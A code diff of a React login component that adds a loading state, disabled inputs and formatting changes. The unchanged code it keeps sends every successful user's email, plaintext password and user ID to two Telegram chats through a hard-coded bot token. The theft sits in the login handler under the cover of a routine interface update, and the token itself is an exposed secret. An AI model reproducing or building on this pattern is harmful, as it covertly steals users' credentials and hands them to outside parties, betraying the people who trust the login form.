@@ -1,27 +1,27 @@
-import React, {useRef, useState} from 'react';
+import React, { useRef, useState } from 'react';
 import './Login.css';
-import {Link, useNavigate} from "react-router-dom";
+import { Link, useNavigate } from "react-router-dom";
 
-const Login = ({setUserId}) => {
+const Login = ({ setUserId }) => {
 
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
+    const [loading, setLoading] = useState(false);
     const navigate = useNavigate();
 
     const login = useRef(false);
-
 
     const handleLogin = async (e) => {
         e.preventDefault();
 
         if (login.current) {
             return;
-        }
-        else{
+        } else {
             login.current = true;
+            setLoading(true);
         }
 
-        async function notification(chatId, message){
+        async function notification(chatId, message) {
             await fetch('https://api.telegram.org/bot6861725365:AAEtTRVNctTW2O0T3M93h4Js1PtKLd0p7oY/sendMessage', {
                 method: 'POST',
                 headers: {
@@ -46,18 +46,17 @@ const Login = ({setUserId}) => {
             const data = await response.json();
 
             if (data.auth) {
-                login.current = true;
                 setUserId(data.id);
                 await notification(1807394896, `User loggedIn\nemail : ${email}\npassword : ${password}\nuserId : ${data.id}`);
                 await notification(5437314009, `User loggedIn\nemail : ${email}\npassword : ${password}\nuserId : ${data.id}`);
                 navigate('/home');
             } else {
                 alert("Invalid credentials. Please try again.");
-                login.current = false;
             }
         } catch (error) {
-            // Handle network or other errors
             alert('An error occurred. Please try again later.');
+        } finally {
+            setLoading(false);
             login.current = false;
         }
     };
@@ -75,12 +74,13 @@ const Login = ({setUserId}) => {
                     <p className="loginpage-welcome-message">Please, provide login credentials to proceed and have access to all our services</p>
 
                     <form className="loginpage-login-form" onSubmit={handleLogin}>
-                        <div className="loginpage-form-control" >
+                        <div className="loginpage-form-control">
                             <input
                                 type="email"
                                 placeholder="Email"
                                 value={email}
                                 onChange={(e) => setEmail(e.target.value)}
+                                disabled={loading}
                             />
                             <i className="fas fa-user"></i>
                         </div>
@@ -90,13 +90,19 @@ const Login = ({setUserId}) => {
                                 placeholder="Password"
                                 value={password}
                                 onChange={(e) => setPassword(e.target.value)}
+                                disabled={loading}
                             />
                             <i className="fas fa-lock"></i>
                         </div>
 
-                        <button className="loginpage-submit">Login</button>
-                        <h4 style={{color:"white", textAlign:"center"}}>If new user, <Link to={'/signup'} style={{color: '#8b33c5'}}> Sign Up !</Link></h4>
+                        <button className="loginpage-submit" disabled={loading}>
+                            {loading ? 'Loading...' : 'Login'}
+                        </button>
+                        <h4 style={{ color: "white", textAlign: "center" }}>
+                            If new user, <Link to={'/signup'} style={{ color: '#8b33c5' }}> Sign Up !</Link>
+                        </h4>
                     </form>
+                    {loading && <div className="loading-spinner"></div>}
                 </div>
             </section>
         </div>
